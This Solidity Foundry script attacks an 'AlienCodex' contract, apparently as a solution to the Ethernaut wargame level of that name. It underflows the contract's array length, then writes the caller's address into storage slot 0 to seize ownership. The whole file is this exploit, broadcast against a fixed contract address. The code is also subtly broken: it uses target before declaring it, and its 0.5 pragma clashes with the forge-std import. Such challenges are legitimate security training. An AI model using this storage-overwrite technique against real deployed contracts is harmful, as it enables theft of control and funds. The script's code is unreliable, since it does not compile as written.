pragma solidity ^0.5.0;

import {Script, console} from "forge-std/Script.sol";
import {AlienCodex} from "../src/AlienCodex.sol";

contract AlienCodexScript is Script {
    address private constant ALIEN_CODEX = 0x849213d54068C1B1805A493C08f142cE9a311566;

    function run() external {
        vm.startBroadcast();

        console.log("Old owner:", target.owner());

        AlienCodex target = AlienCodex(ALIEN_CODEX);
        target.makeContact();
        target.retract();
        uint256 index = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(2))));
        target.revise(index, bytes32(uint256(uint160(msg.sender))));

        console.log("New owner:", target.owner());

        vm.stopBroadcast();
    }
}
